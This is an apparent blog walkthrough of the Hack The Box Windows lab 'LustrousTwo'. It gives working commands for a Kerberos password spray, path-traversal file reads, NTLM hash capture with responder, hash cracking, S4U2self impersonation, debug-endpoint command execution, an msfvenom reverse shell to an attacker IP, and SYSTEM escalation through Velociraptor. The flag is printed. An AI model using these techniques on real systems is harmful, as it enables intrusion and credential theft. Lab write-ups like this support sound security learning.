---
title: LustrousTwo
date: 2026-01-30
draft: false
ShowToc: true
TocOpen: true
tags:
  - blog
  - HTB
  - windows
  - hard
  - ftp
  - kerberbrute
  - bloodhound
  - lfi
  - password-cracking
  - code-review
  - s4u2self
  - rce
  - velociraptor
lastmod: 2026-02-02T08:52:06.840Z
---
# Box Info

LustrousTwo is a hard-rated Windows box that deals with LDAP signing, channel binding, and disabled NTLM authentication. The box has a web server vulnerable to arbitrary file read, which helps attackers capture a Net-NTLMv2 hash for the service account, using it to request Service Tickets via s4u2self, a stealthier alternative to Silver Ticket, to bypass protective measures like Account is sensitive and cannot be delegated. After reversing and auditing the source code, the attacker achieves Remote Code Execution. For privilege escalation, the attacker exploits a misconfigured, insecure Velociraptor installation.
LustrousTwo is a hard-rated Windows box that deals with LDAP signing, channel binding, and disabled NTLM authentication. The box has a web server vulnerable to arbitrary file read, which helps attackers capture a Net-NTLMv2 hash for the service account, using it to request Service Tickets via s4u2self, a stealthier alternative to Silver Ticket, to bypass protective measures like Account is sensitive and cannot be delegated. After reversing and auditing the source code, the attacker achieves Remote Code Execution. For privilege escalation, the attacker exploits a misconfigured, insecure Velociraptor installation.

LustrousTwo 是一台硬級 Windows 機，處理 LDAP 簽約、通道綁定，以及停用的 NTLM 認證。該裝置有一個網頁伺服器，容易被任意檔案讀取，這幫助攻擊者捕捉該服務帳號的 `Net-NTLMv2` 雜湊值，藉此透過 `s4u2self`（銀票 更隱蔽的替代方案）請求服務票，繞過像 `Account is sensitive and cannot be delegated` .在還原並稽核原始碼後，攻擊者會實現遠端程式碼執行。為了提升權限，攻擊者利用一個配置錯誤且不安全的[迅猛龍](https://github.com/Velocidex/velociraptor)  安裝。

\#kerbrute #bloodhound #brute-force #LFI #windows\_LFI #ftp #kerberasing #ntpdate #NTLM #Firefox #Firefox\_kerberos #velociraptor

***

# Recon

### \[\[PORT & IP SCAN]]

Standard Windows setting  , having the port 21 , and port 80 which is cannot being see anything    , and the ldap dont same with the normal one .

```powershell
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.242.166 -oN serviceScan.txt

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-31 11:57 +0800
Nmap scan report for 10.129.242.166
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 09-06-24  04:20AM       <DIR>          Development
| 04-14-25  03:44AM       <DIR>          Homes
| 08-31-24  12:57AM       <DIR>          HR
| 08-31-24  12:57AM       <DIR>          IT
| 04-14-25  03:44AM       <DIR>          ITSEC
| 08-31-24  12:58AM       <DIR>          Production
|_08-31-24  12:58AM       <DIR>          SEC
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Negotiate
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-31 03:57:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:LUS2DC.Lustrous2.vl
| Not valid before: 2025-09-29T14:23:23
|_Not valid after:  2026-09-29T14:23:23
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:LUS2DC.Lustrous2.vl
| Not valid before: 2025-09-29T14:23:23
|_Not valid after:  2026-09-29T14:23:23
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:LUS2DC.Lustrous2.vl
| Not valid before: 2025-09-29T14:23:23
|_Not valid after:  2026-09-29T14:23:23
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: Lustrous2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:LUS2DC.Lustrous2.vl
| Not valid before: 2025-09-29T14:23:23
|_Not valid after:  2026-09-29T14:23:23
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-31T03:59:00+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=LUS2DC.Lustrous2.vl
| Not valid before: 2025-09-28T14:32:31
|_Not valid after:  2026-03-30T14:32:31
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
60733/tcp open  msrpc         Microsoft Windows RPC
60746/tcp open  msrpc         Microsoft Windows RPC
60764/tcp open  msrpc         Microsoft Windows RPC
62751/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
62752/tcp open  msrpc         Microsoft Windows RPC
63367/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: LUS2DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-31T03:58:24
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.16 seconds

```

### \[\[FTP 21]] -- Scans

{{< toggle "Tag 🏷️: " >}}
{{< tag "ftp anonymous login" >}}
{{< /toggle >}}

1. Allow the anonymous login
2. Got the `audit_draft.txt`  which is remind me to have the weak password  , so i must do the brute\_forcelow
3. Have the nameuserform the home , i will create the nameuser.txt  and put the name by `cat tmp.txt| awk -F ' ' '{print $4}'`  to get the clean name list.
4. After have the namelist , i will verify the namelist by kerbrute userenum.
   * ![Pasted image 20260131120624.png](/ob/Pasted%20image%2020260131120624.png)

In view of avoiding the kerber auth fail , i will use the `ntpdate` to make my machine is same with Box.

### ntpdate

{{< toggle "Tag 🏷️: " >}}
{{< tag "ntpdate" >}}
{{< tag "KRB5KRB_AP_ERR_SKEW" >}} You must use ntpdate immediately after discovering the Domain Controller (DC) and before running any Kerberos tools (like Rubeus, Impacket, BloodHound, or Kerbrute). The Error You Avoid: KRB5KRB_AP_ERR_SKEW (Clock skew too great)
{{< /toggle >}}

```
└─# sudo apt install ntpsec-ntpdate
The following packages were automatically installed and are no longer required:
  azurehound     criu           libcompel1  libintl-perl     libmjpegutils-2.1-0t64  libmpeg2encpp-2.1-0t64  libproc-processtable-perl  linux-image-6.12.13-amd64  node-fs.realpath  python3-protobuf  sharphound   tracker-extract
  bloodhound.py  docker-buildx  libgav1-1   libintl-xs-perl  libmodule-find-perl     libmplex2-2.1-0t64      libsort-naturally-perl     needrestart                node-inflight     python3-pycriu    tini-static
Use 'sudo apt autoremove' to remove them.
                                                                                             
┌──(haydon_env)─(root㉿kali)-[~/vpn]
└─# sudo ntpdate LUS2DC.Lustrous2.vl
2026-01-31 14:13:07.967307 (+0800) -0.364749 +/- 0.041564 LUS2DC.Lustrous2.vl 10.129.242.166 s1 no-leap
                                          
```

# Shell as Thomas.Myers

### Brute force the Username by kerberos

{{< toggle "Tag 🏷️: Active Directory Kerberos Username BruteForce" >}}
{{< tag "kerberbrute" >}}

Base on the kerbrute dont have the function to username List and the password LIst to do the bruteforceen , so i will create the bash script to  do the brute-force  `ker_brute.sh`...

{{< /toggle >}}


Base on the kerbrute dont have the function to username List and the password LIst to do the bruteforceen , so i will create the bash script to  do the brute-force  `ker_brute.sh` , below have 2 version , the first one is recommend , the second one which i use something .  Finally i can find the  account of `Thomas.Myers@Lustrous2.vl:Lustrous2024`

```
└─# cat ker_brute.sh 
#!/bin/bash

# Configuration
users_file="username.txt"
wordlist="password.txt"
dc_ip="lus2dc.lustrous2.vl"
domain="lustrous2.vl"

# Check if the users file exists
if [[ ! -f "$users_file" ]]; then
  echo "Error: The file '$users_file' was not found."
  exit 1
fi

# Check if the password wordlist exists
if [[ ! -f "$wordlist" ]]; then
  echo "Error: The file '$wordlist' was not found."
  exit 1
fi

# Iterate through each user in the list
while read -r username; do
  echo "Checking user: $username@$domain"
  
  # Execute kerbrute
  /root/go/bin/kerbrute bruteuser --dc "$dc_ip" -d "$domain" "$wordlist" "$username@$domain" -v

  # Check if the command executed successfully
  if [[ $? -ne 0 ]]; then
    echo "Warning: An issue occurred while processing $username@$domain"
  fi

  echo "Finished processing: $username@$domain"
  echo "-------------------------------------"
done < "$users_file"

echo "Process complete."

```

```powershell
─# while read -r password; do
    echo "Testing password: $password"
    ./kerbrute_dev passwordspray --dc LUS2DC.Lustrous2.vl -d Lustrous2.vl username.txt "$password"
done < password.txt
Testing password: LustrousTwo2024

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (23a0358) - 01/31/26 - Ronnie Flathers @ropnop

2026/01/31 14:26:06 >  Using KDC(s):
2026/01/31 14:26:06 >   LUS2DC.Lustrous2.vl:88

2026/01/31 14:26:08 >  Done! Tested 71 logins (0 successes) in 1.687 seconds
Testing password: Lustrous2024

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (23a0358) - 01/31/26 - Ronnie Flathers @ropnop

2026/01/31 14:26:08 >  Using KDC(s):
2026/01/31 14:26:08 >   LUS2DC.Lustrous2.vl:88

2026/01/31 14:26:10 >  [+] VALID LOGIN:  Thomas.Myers@Lustrous2.vl:Lustrous2024
2026/01/31 14:26:10 >  Done! Tested 71 logins (1 successes) in 2.208 seconds

```

### bloodhound-ce-python

{{< toggle "Tag 🏷️: " >}}
{{< tag "bloodhound" >}}
{{< tag "bloodhound-ce-python" >}}  This package contains a Python based ingestor for BloodHound CE, based on Impacket.

{{< /toggle >}}

I used the rust-bloodhound , boodhound-python , also is fail , and need to use the bloodhound with the `--with ldap3-bleeding-edge` to be success

```
bloodhound-ce-python -u thomas.myers -no-pass -k -d lustrous2.vl -ns  10.129.242.166  -c All --zip 
```

Failed example\
![Pasted image 20260131161744.png](/ob/Pasted%20image%2020260131161744.png)

Install with `uv`

```
 uv tool install git+https://github.com/dirkjanm/BloodHound.py.git@bloodhound-ce --with ldap3-bleeding-edge
```

```
┌──(haydon_env)─(root㉿kali)-[~/Desktop]
└─# uv pip install ldap3-bleeding-edge

Using Python 3.13.11 environment at: haydon_env
Resolved 6 packages in 24ms
Installed 1 package in 43ms
 + ldap3-bleeding-edge==2.10.1.1338
                                                                                                                                                                                                                                                                             
┌──(haydon_env)─(root㉿kali)-[~/Desktop]
└─# uv run bloodhound-ce-python -u thomas.myers -no-pass -k -d lustrous2.vl -ns  10.129.242.166 --ldap-channel-binding -c All --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: lustrous2.vl
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: lus2dc.lustrous2.vl
INFO: Testing resolved hostname connectivity dead:beef::f253:4466:628d:7dbd
INFO: Trying LDAP connection to dead:beef::f253:4466:628d:7dbd
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 4 computers
INFO: Connecting to LDAP server: lus2dc.lustrous2.vl
INFO: Testing resolved hostname connectivity dead:beef::f253:4466:628d:7dbd
INFO: Trying LDAP connection to dead:beef::f253:4466:628d:7dbd
INFO: Found 75 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: LUS2DC.Lustrous2.vl
INFO: Done in 00M 29S
INFO: Compressing output into 20260131161902_bloodhound.zip

```

![Pasted image 20260131162054.png](/ob/Pasted%20image%2020260131162054.png)

However, the `Tjomas.MYERS` dont have outblound to going anywhere  , so my idea is go back to FTP , and the web (80) to by use this account , so i create the sliver ticket to check the website, also base on the website is made by windows  , so can using the kerberosing to auth the web to check\
![Pasted image 20260201170121.png](/ob/Pasted%20image%2020260201170121.png)

### krb5.conf

```
sudo apt install krb5-user krb5-config
```

```
netexec smb lus2dc.lustrous2.vl --generate-krb5-file krb5.conf
```

```
sudo cp krb5.conf /etc/krb5.conf
```

i used the `getTGT.py` to do it , and also you can use the `kinit` to finish this

```
└─# getTGT.py lustrous2.vl/Thomas.Myers:'Lustrous2024' -dc-ip 10.129.242.166
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Thomas.Myers.ccache

```

```
export KRB5CCNAME=Thomas.Myers.ccache
```

```
kinit
```

![Pasted image 20260131153431.png](/ob/Pasted%20image%2020260131153431.png)

using the `curl` with the `--negotiate` , `-u ` forcing to  do the kerberosing auth , and we got the 200 webpage return.

```
└─# curl -I --negotiate -u : http://lus2dc.lustrous2.vl
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate oYG3MIG0oAMKAQChCwYJKoZIhvcSAQICooGfBIGcYIGZBgkqhkiG9xIBAgICAG+BiTCBhqADAgEFoQMCAQ+iejB4oAMCARKicQRv/vf2cakmJcAjh4YwQ3EO5oxJex2D2VrXVfQdqbFS4whE16Lr2YW/IKTIHc8zFmHnqZ2aMmX3sBTTGcvNVi77nQ0liipfCtueiIwDU/ZRz/QhGvo5SSmnel7rT/e4yGbAQMt/+ZRbTU4hEDgnD1jL
Persistent-Auth: true
X-Powered-By: ASP.NET
Date: Sat, 31 Jan 2026 07:24:38 GMT
```

found something we can donwload, so we can try the windows other file can be downloaded ? like the hosts file\
![Pasted image 20260131153741.png](/ob/Pasted%20image%2020260131153741.png)

![Pasted image 20260131153805.png](/ob/Pasted%20image%2020260131153805.png)

using this wordlist `https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Windows` to check , you can use the gobuster or burpsuite to check

```
└─# curl --negotiate -u : http://lus2dc.lustrous2.vl/File/Download?fileName=../../../../windows/system32/drivers/etc/hosts
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
                                                                                                       
```

After the LFI is success , i will try to find the ssh ,but it failed , so i will try to play with the NTLM and LFI as here is the windows.\
Create the the poc.txt for windows to check

```
echo "<?php echo 'hahsha was here'; ?>" > poc.txt
```

open the `responder`

```
responder -I  tun0
```

check our server file  , `10.10.14.8` is my server ip

```
curl --negotiate -u : http://lus2dc.lustrous2.vl/File/Download?fileName=//10.10.14.8/poc.txt  
```

Got the `ShareSvc` NTLM\
![Pasted image 20260131154602.png](/ob/Pasted%20image%2020260131154602.png)

### John crack

```
└─# john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt forend_ntlmv2

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#1Service        (ShareSvc)     
1g 0:00:00:04 DONE (2026-01-31 15:48) 0.2212g/s 3172Kp/s 3172Kc/s 3172KC/s #1WIF3Y..!Smartinp
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

### Code Review

Got account of the `ShareSvc:#1Service` , although the smb with the kerberos is success, but i also cant go anywhere

```
─# netexec smb lus2dc.lustrous2.vl -u sharesvc -p '#1Service' -k
SMB         lus2dc.lustrous2.vl 445    lus2dc           [*]  x64 (name:lus2dc) (domain:lustrous2.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         lus2dc.lustrous2.vl 445    lus2dc           [+] lustrous2.vl\sharesvc:#1Service 
```

Ofz i will check the `web.config` , and found the LuShare.dll , and i know that here is code review play

```
└─# curl --negotiate -u : http://lus2dc.lustrous2.vl/File/Download?fileName=../../web.config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <location path="." inheritInChildApplications="false">
    <system.webServer>
      <handlers>
        <add name="aspNetCore" path="*" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
      </handlers>
      <aspNetCore processPath="dotnet" arguments=".\LuShare.dll" stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" hostingModel="inprocess" />
    </system.webServer>
  </location>
</configuration>
<!--ProjectGuid: 4E46018E-B73C-4E7B-8DA2-87855F22435A-->     
```

Download the `LuShare.dll`

```
url --negotiate -u : http://lus2dc.lustrous2.vl/File/Download?fileName=../../LuShare.dll -o LuShare.dll
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100  53760 100  53760   0      0 139.9k      0                              0
                                                                                                                                                                                           
┌──(haydon_env)─(root㉿kali)-[~/Desktop]
└─# cat LuShare.dll                                                                                         
MZ����@���      �!�L�!This program cannot be run in DOS mode.
$PELn:U��"
          0R� @ @`���O< 
                         � H.textX� � `.rsrc<�@@.reloc
                                                       �@B2�HV�{

```

I will use the https://www.jetbrains.com/decompiler/ to check the source code, and found the upload and download function , and know that i mhe ay be need to as soething sof shareAdmin of the role to have the upload function\
![Pasted image 20260131162621.png](/ob/Pasted%20image%2020260131162621.png)

So i back to the bloodhound to check the `shareAdmin` to get the `Ryan.Davies`\
![Pasted image 20260131162548.png](/ob/Pasted%20image%2020260131162548.png)

# Shell as RYAN.DAVIES

### getST.py

Although i dont have the `Ryan.Davies` account , but i can impersonate it by `ShareSvc`

```
└─# getST.py   -impersonate RYAN.DAVIES  -k 'LUSTROUS2.VL/ShareSvc:#1Service'  -self   -altservice HTTP/lus2dc.lustrous2.vl
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating RYAN.DAVIES
[*] Requesting S4U2self
[*] Saving ticket in RYAN.DAVIES@ShareSvc@LUSTROUS2.VL.ccache
                                                                                                                                                                                                                                           
┌──(haydon_env)─(root㉿kali)-[~/Desktop]
└─# klist    
klist: No credentials cache found (filename: /tmp/krb5cc_0)
                                                                                                                                                                                                                                           
┌──(haydon_env)─(root㉿kali)-[~/Desktop]
└─# export KRB5CCNAME=RYAN.DAVIES@ShareSvc@LUSTROUS2.VL.ccache
                                                                                                                                                                                                                                           
┌──(haydon_env)─(root㉿kali)-[~/Desktop]
└─# klist 
Ticket cache: FILE:RYAN.DAVIES@ShareSvc@LUSTROUS2.VL.ccache
Default principal: RYAN.DAVIES@LUSTROUS2.VL

Valid starting       Expires              Service principal
2026-01-31T23:57:34  2026-02-01T09:57:34  ShareSvc@LUSTROUS2.VL
        renew until 2026-02-01T23:57:34
                                                     
```

```
firefox
```

### firefox with kerberos RYAN.DAVIES

By default, Firefox won't send Kerberos tickets to websites for security reasons. You need to whitelist your domain.   open the firefox in the terminal\
![Pasted image 20260202161556.png](/ob/Pasted%20image%2020260202161556.png)

1. Open Firefox and type **`about:config`** in the address bar.

2. Click **"Accept the Risk and Continue"**.

3. Search for the following preference: `network.negotiate-auth.trusted-uris`

4. Double-click it and enter the domain or the specific root: `lustrous2.vl` (or `.lustrous2.vl` to include all subdomains).

5. Search for: `network.negotiate-auth.delegation-uris`

6. Enter the same domain there: `lustrous2.vl`

Now we can have the function ,and check the source code to know there is the `/Debug` path\
![Pasted image 20260201001302.png](/ob/Pasted%20image%2020260201001302.png)

### Reverse Shell

Get the PIN by the source code which is `ba45c518`\
![Pasted image 20260201001914.png](/ob/Pasted%20image%2020260201001914.png)

check `whoami`

```powershell
curl --negotiate -u : http://lus2dc.lustrous2.vl -X $'POST' -H $'Referer: http://lus2dc.lustrous2.vl/File/Debug'  -b $'.AspNetCore.Antiforgery.ZeXwmOAhXkU=CfDJ8PnO3CCwXQxHvbAXH0aUImayeEsmW4ELkJomMW82xiKdwAwmI8MXb6s1h0yw9rFytdxzKqkHViGQpZs9wZsmd13Evu1Zvrwf2zyWbOHwW7ynlkgqaGveVs0iGilKEUwEbYpfa1sBRBPadEFEAaMgqSE' \
    --data-binary $'command=whoami&pin=ba45c518&__RequestVerificationToken=CfDJ8PnO3CCwXQxHvbAXH0aUImYBqm6kbCmAFPlXD8Rt4wHMjOSaXOogsHSxP_0pAn8773c6XfoovEoXJU8vKgznFgYzS6nEBKF8dwW9YsULlJASbQUEbaBGicLDMfCpK5mHJTGqDh3R6mIY3PmaA2xbvUYOy-xWEgbqxCiCSVXMUTgp5AwCXLlzRnacdLRhPhbPBQ' \
    $'http://lus2dc.lustrous2.vl/File/Debug'

```

check `wwwroot/uploads`

```powershell
curl --negotiate -u : http://lus2dc.lustrous2.vl -X $'POST' -H $'Referer: http://lus2dc.lustrous2.vl/File/Debug'  -b $'.AspNetCore.Antiforgery.ZeXwmOAhXkU=CfDJ8PnO3CCwXQxHvbAXH0aUImayeEsmW4ELkJomMW82xiKdwAwmI8MXb6s1h0yw9rFytdxzKqkHViGQpZs9wZsmd13Evu1Zvrwf2zyWbOHwW7ynlkgqaGveVs0iGilKEUwEbYpfa1sBRBPadEFEAaMgqSE' \
    --data-binary $'command=dir wwwroot/uploads&pin=ba45c518&__RequestVerificationToken=CfDJ8PnO3CCwXQxHvbAXH0aUImYBqm6kbCmAFPlXD8Rt4wHMjOSaXOogsHSxP_0pAn8773c6XfoovEoXJU8vKgznFgYzS6nEBKF8dwW9YsULlJASbQUEbaBGicLDMfCpK5mHJTGqDh3R6mIY3PmaA2xbvUYOy-xWEgbqxCiCSVXMUTgp5AwCXLlzRnacdLRhPhbPBQ' \
    $'http://lus2dc.lustrous2.vl/File/Debug'

```

found i found file in the `wwwroot/uploads/reverse.exe`

![Pasted image 20260201003112.png](/ob/Pasted%20image%2020260201003112.png)

```
C:\inetpub\lushare\wwwroot\uploads\audit.txt
C:\inetpub\lushare\wwwroot\uploads\reverse.exe
```

Execute the `C:\inetpub\lushare\wwwroot\uploads\reverse.exe` to have the reverse shell

```powershell
curl --negotiate -u : http://lus2dc.lustrous2.vl -X $'POST' -H $'Referer: http://lus2dc.lustrous2.vl/File/Debug'  -b $'.AspNetCore.Antiforgery.ZeXwmOAhXkU=CfDJ8PnO3CCwXQxHvbAXH0aUImayeEsmW4ELkJomMW82xiKdwAwmI8MXb6s1h0yw9rFytdxzKqkHViGQpZs9wZsmd13Evu1Zvrwf2zyWbOHwW7ynlkgqaGveVs0iGilKEUwEbYpfa1sBRBPadEFEAaMgqSE' \
    --data-binary $'command=C:/inetpub/lushare/wwwroot/uploads/reverse.exe&pin=ba45c518&__RequestVerificationToken=CfDJ8PnO3CCwXQxHvbAXH0aUImYBqm6kbCmAFPlXD8Rt4wHMjOSaXOogsHSxP_0pAn8773c6XfoovEoXJU8vKgznFgYzS6nEBKF8dwW9YsULlJASbQUEbaBGicLDMfCpK5mHJTGqDh3R6mIY3PmaA2xbvUYOy-xWEgbqxCiCSVXMUTgp5AwCXLlzRnacdLRhPhbPBQ' \
    $'http://lus2dc.lustrous2.vl/File/Debug'

```

![Pasted image 20260201003322.png](/ob/Pasted%20image%2020260201003322.png)

![Pasted image 20260201003526.png](/ob/Pasted%20image%2020260201003526.png)

# Shell as Admin

whoami is not work

```
C:\>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                        State   
============================= ================================== ========
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled
SeMachineAccountPrivilege     Add workstations to domain         Disabled
SeAuditPrivilege              Generate security audits           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking           Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled
```

check the Program Files,and find something should not be here, like here is the `Amazon`,`Velociraptor`,`VelociraptorServer`

```
C:\Program Files>dir
dir
 Volume in drive C is System
 Volume Serial Number is 58B1-CECF

 Directory of C:\Program Files

04/14/2025  01:57 AM    <DIR>          .
04/14/2025  02:05 AM    <DIR>          Amazon
08/31/2024  12:03 AM    <DIR>          Common Files
09/06/2024  04:39 AM    <DIR>          dotnet
09/06/2024  04:38 AM    <DIR>          IIS
04/14/2025  03:50 PM    <DIR>          Internet Explorer
05/08/2021  12:20 AM    <DIR>          ModifiableWindowsApps
09/06/2024  07:35 AM    <DIR>          Velociraptor
09/06/2024  07:34 AM    <DIR>          VelociraptorServer
04/14/2025  01:57 AM    <DIR>          VMware
08/31/2024  12:55 AM    <DIR>          Windows Defender
06/26/2025  06:12 AM    <DIR>          Windows Defender Advanced Threat Protection
04/14/2025  03:50 PM    <DIR>          Windows Mail
04/14/2025  03:50 PM    <DIR>          Windows Media Player
05/08/2021  01:35 AM    <DIR>          Windows NT
04/14/2025  03:50 PM    <DIR>          Windows Photo Viewer
05/08/2021  12:34 AM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              17 Dir(s)   5,326,266,368 bytes free

```

```
C:\Program Files\VelociraptorServer>velociraptor-v0.72.4-windows-amd64.exe --config server.config.yaml config api_cl
velociraptor-v0.72.4-windows-amd64.exe --config server.config.yaml config api_client --name admin --role administrat
[ERROR] 2026-02-02T00:33:15-08:00 Unable to open file \\?\c:\datastore\config\inventory.json.db: open \\?\c:\datasto
[ERROR] 2026-02-02T00:33:15-08:00 Unable to open file \\?\c:\datastore\config\inventory.json.db: open \\?\c:\datasto
[ERROR] 2026-02-02T00:33:15-08:00 Unable to open file \\?\c:\datastore\config\inventory.json.db: open \\?\c:\datasto
Creating API client file on \programdata\api.config.yaml.
[ERROR] 2026-02-02T00:33:15-08:00 Unable to open file \\?\c:\datastore\acl\admin.json.db: open \\?\c:\datastore\acl\
velociraptor-v0.72.4-windows-amd64.exe: error: config api_client: Unable to set role ACL: open \\?\c:\datastore\acl\
```

```
C:\Program Files\VelociraptorServer>velociraptor-v0.72.4-windows-amd64.exe --api_config \programdata\api.config.yaml
velociraptor-v0.72.4-windows-amd64.exe --api_config \programdata\api.config.yaml query "SELECT * FROM execve(argv=['
[
 {
  "Stdout": "nt authority\\system\r\n",
  "Stderr": "",
  "ReturnCode": 0,
  "Complete": true
 }
]
```

```
rlwrap -cAr nc -lnvp 443
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.31 LPORT=443  -f exe -o reverseAdmin.exe
```

```
C:\Program Files\VelociraptorServer>.\velociraptor-v0.72.4-windows-amd64.exe --api_config \programdata\api.config.yaml query "SELECT * FROM execve(argv=['C:\\inetpub\\lushare\\wwwroot\\uploads\\reverseAdmin.exe'])"
```

![Pasted image 20260202164418.png](/ob/Pasted%20image%2020260202164418.png)

`0544d47f726b4bac144db63fdeaee2b8`

![Pasted image 20260202164538.png](/ob/Pasted%20image%2020260202164538.png)
